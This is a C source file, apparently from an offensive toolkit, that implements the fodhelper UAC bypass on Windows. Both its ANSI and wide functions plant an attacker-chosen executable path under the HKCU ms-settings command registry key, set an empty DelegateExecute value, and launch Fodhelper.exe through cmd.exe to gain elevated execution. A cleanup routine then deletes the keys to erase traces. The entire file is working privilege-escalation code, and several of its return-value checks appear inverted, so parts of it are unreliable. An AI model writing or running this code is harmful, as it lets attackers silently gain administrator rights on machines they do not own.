#include "Win32Helper.h"

BOOL UnusedSubroutineCleanupFodHelperArtifacts(HKEY hKey)
{
	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	return TRUE;

EXIT_ROUTINE:

	return FALSE;
}

BOOL UacBypassFodHelperMethodW(_In_ PWCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi)
{
	HKEY hKey = HKEY_CURRENT_USER, hkResult;
	WCHAR pvData[MAX_PATH * sizeof(WCHAR)] = { 0 };
	WCHAR lpApplicationName[MAX_PATH * sizeof(WCHAR)] = L"C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\Fodhelper.exe";
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;

	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	if (!RegCreateKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL))
		goto EXIT_ROUTINE;

	if (!RegSetKeyValueW(hkResult, NULL, NULL, REG_SZ, PathToBinaryToExecute, (DWORD)StringLengthW(PathToBinaryToExecute) * (DWORD)sizeof(WCHAR)))
		goto EXIT_ROUTINE;

	if (!RegGetValueW(hkResult, NULL, L"DelegateExecute", RRF_RT_REG_SZ, NULL, pvData, &dwError))
	{
		if (GetLastErrorFromTeb() == ERROR_FILE_NOT_FOUND)
		{
			if (!RegSetKeyValueW(hkResult, NULL, L"DelegateExecute", REG_SZ, NULL, 0))
				goto EXIT_ROUTINE;
		}
		else
			goto EXIT_ROUTINE;
	}

	dwError = ERROR_SUCCESS;

	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", lpApplicationName, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS, NULL, NULL, &Si, Pi))
		goto EXIT_ROUTINE;

	Sleep(1000);

	if (!UnusedSubroutineCleanupFodHelperArtifacts(hKey))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if(!bFlag)
		dwError = GetLastErrorFromTeb();

	if (hkResult)
		RegCloseKey(hkResult);

	if (hKey)
		RegCloseKey(hKey);

	return dwError;
}

BOOL UacBypassFodHelperMethodA(_In_ PCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi)
{
	HKEY hKey = HKEY_CURRENT_USER, hkResult;
	CHAR pvData[MAX_PATH] = { 0 };
	CHAR lpApplicationName[MAX_PATH] = "C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\Fodhelper.exe";
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;

	STARTUPINFOA Si = { 0 };
	Si.cb = sizeof(STARTUPINFOA);

	if (!RegCreateKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL))
		goto EXIT_ROUTINE;

	if (!RegSetKeyValueA(hkResult, NULL, NULL, REG_SZ, PathToBinaryToExecute, (DWORD)StringLengthA(PathToBinaryToExecute)))
		goto EXIT_ROUTINE;

	if (!RegGetValueA(hkResult, NULL, "DelegateExecute", RRF_RT_REG_SZ, NULL, pvData, &dwError))
	{
		if (GetLastErrorFromTeb() == ERROR_FILE_NOT_FOUND)
		{
			if (!RegSetKeyValueA(hkResult, NULL, "DelegateExecute", REG_SZ, NULL, 0))
				goto EXIT_ROUTINE;
		}
		else
			goto EXIT_ROUTINE;
	}

	dwError = ERROR_SUCCESS;

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", lpApplicationName, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS, NULL, NULL, &Si, Pi))
		goto EXIT_ROUTINE;

	Sleep(1000);

	if (!UnusedSubroutineCleanupFodHelperArtifacts(hKey))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (!bFlag)
		dwError = GetLastErrorFromTeb();

	if (hkResult)
		RegCloseKey(hkResult);

	if (hKey)
		RegCloseKey(hKey);

	return dwError;
}